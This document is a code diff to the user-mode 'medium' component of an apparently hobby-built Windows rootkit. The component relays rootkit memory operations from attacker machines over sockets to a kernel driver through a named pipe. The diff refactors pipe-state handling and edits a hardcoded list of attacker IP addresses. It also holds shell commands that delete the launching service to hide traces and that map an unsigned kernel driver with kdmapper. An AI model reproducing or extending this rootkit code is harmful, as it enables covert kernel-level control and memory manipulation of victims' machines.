@@ -11,13 +11,12 @@ BOOL ShouldQuit() {
 }
 
 
-int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog) {
+int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, LogFile* MediumLog, BOOL* IsValidPipe) {
     int OprResult = 0;
     DWORD LastError = 0;
     PASS_DATA result;
     PVOID SendBuf = NULL;
     ULONG SendSize = 0;
-    BOOL IsValidPipe = TRUE;
     ROOTKIT_OPERATION RootStat = RKOP_NOOPERATION;
     ROOTKIT_MEMORY OprBuffer;
     PVOID LocalRead = NULL;
@@ -35,19 +34,19 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
 
 
     while (TRUE) {
-        if (!IsValidPipe) {
+        if (!*IsValidPipe) {
             // Create valid pipe for communications:
-            IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
+            *IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
             while (!IsValidPipe) {
-                IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
+                *IsValidPipe = OpenPipe(PipeHandle, MainPipeName, MediumLog);
             }
 
             // Connect to driver client with pipe:
-            IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
-            if (!IsValidPipe) {
+            *IsValidPipe = ConnectNamedPipe(*PipeHandle, NULL);
+            if (!*IsValidPipe) {
                 LastError = GetLastError();
                 if (LastError == ERROR_PIPE_CONNECTED) {
-                    IsValidPipe = TRUE;
+                    *IsValidPipe = TRUE;
                     LastError = 0;
                     MediumLog->WriteLog((PVOID)"MainMedium pipe - driver already connected to pipe between creating it and connecting to it!\n", 94);
                 }
@@ -62,7 +61,7 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
         }
 
         // Actual medium operations:
-        while (IsValidPipe) {
+        while (*IsValidPipe) {
             result = root_internet::RecvData(SndInfo.AsoSock, sizeof(RootStat), &RootStat, FALSE, 0);
             if (!result.err && result.value == sizeof(RootStat)) {
                 if (ShouldQuit()) {
@@ -77,6 +76,9 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
                     }
 
                     closesocket(SndInfo.AsoSock);
+                    *IsValidPipe = FALSE;
+                    DisconnectNamedPipe(*PipeHandle);
+                    ClosePipe(PipeHandle);
                     return -1;
                 }
 
@@ -222,6 +224,9 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
                         if (result.Term) {
                             printf("Critical error occurred, closing connection with specific client..\n");
                             closesocket(SndInfo.AsoSock);
+                            *IsValidPipe = FALSE;
+                            DisconnectNamedPipe(*PipeHandle);
+                            ClosePipe(PipeHandle);
                             return -1;
                         }
                         break;
@@ -233,7 +238,7 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
                     SendBuf = NULL;
                     SysErrInit = successful;
                     if (OprResult == -1) {
-                        IsValidPipe = FALSE;
+                        *IsValidPipe = FALSE;
                         DisconnectNamedPipe(*PipeHandle);
                         ClosePipe(PipeHandle);
                     }
@@ -247,6 +252,7 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
                 if (result.Term) {
                     printf("Critical error occured, closing connection with specific client..\n");
                     closesocket(SndInfo.AsoSock);
+                    *IsValidPipe = FALSE;
                     DisconnectNamedPipe(*PipeHandle);
                     ClosePipe(PipeHandle);
                     return 0;
@@ -256,6 +262,7 @@ int MediumAct(NETWORK_INFO SndInfo, NETWORK_INFO SrvInfo, HANDLE* PipeHandle, Lo
         }
     }
     closesocket(SndInfo.AsoSock);
+    *IsValidPipe = FALSE;
     DisconnectNamedPipe(*PipeHandle);
     ClosePipe(PipeHandle);
     return 0;
@@ -278,11 +285,11 @@ int main(int argc, char *argv[]) {
     MediumLog.InitiateFile("C:\\nosusfolder\\verysus\\MediumLogFile.txt");
 
     // HARDCODED VALUE, GENERATED FROM ListAttacker IN trypack\AttackerFile\attackerips.txt
-    const char* AttackAddresses = "172.18.144.1~172.19.144.1~172.30.48.1~172.23.32.1~172.17.160.1~172.21.0.1~172.24.112.1~192.168.47.1~192.168.5.1~192.168.1.21~172.20.48.1~192.168.56.1";
+    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
 
 
     // Destroy launching service:
-    if (system("sc stop RootAuto && sc delete RootAuto") == -1) {
+    if (system("sc stop RootAuto > nul && sc delete RootAuto > nul") == -1) {
         MediumLog.WriteError("MainMedium pipe - Cannot destroy launching service", GetLastError());
         MediumLog.CloseLog();
         return 0;
@@ -319,12 +326,19 @@ int main(int argc, char *argv[]) {
     }
 
 
+    // Create valid pipe for communications initial -
+    IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
+    while (!IsValidPipe) {
+        IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
+    }
+
+
     // Activate service manager with driver as parameter -
     ReturnStatus = RealTime(TRUE);
     if (ReturnStatus.Represent != ERROR_SUCCESS || ReturnStatus.LastError != 0) {
         return FALSE;
     }
-    if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys") == -1) {
+    if (system("C:\\nosusfolder\\verysus\\kdmapper.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys > c:\\myfilefile.txt") == -1) {
         MediumLog.WriteError("MainMedium pipe - Failed to activate service manager with driver as parameter", GetLastError());
         MediumLog.CloseLog();
         return 0;
@@ -335,12 +349,6 @@ int main(int argc, char *argv[]) {
         return FALSE;
     }
 
-
-    // Create valid pipe for communications initial -
-    IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
-    while (!IsValidPipe) {
-        IsValidPipe = OpenPipe(&PipeHandle, MainPipeName, &MediumLog);
-    }
 
     // Connect to driver client with pipe initial -
     IsValidPipe = ConnectNamedPipe(PipeHandle, NULL);
@@ -385,7 +393,7 @@ int main(int argc, char *argv[]) {
         else {
             NetArr[1].AsoSock = ssckt;
             printf("Initialization of connection succeeded, proceeding to start receiving requests..\n");
-            result = MediumAct(NetArr[1], NetArr[0], &PipeHandle, &MediumLog);
+            result = MediumAct(NetArr[1], NetArr[0], &PipeHandle, &MediumLog, &IsValidPipe);
             printf("Disconnected from (%s, %hu)\n", NetArr[1].IP, NetArr[1].Port);
             root_internet::CleanNetStack(NetArr[1].AsoSock);
 
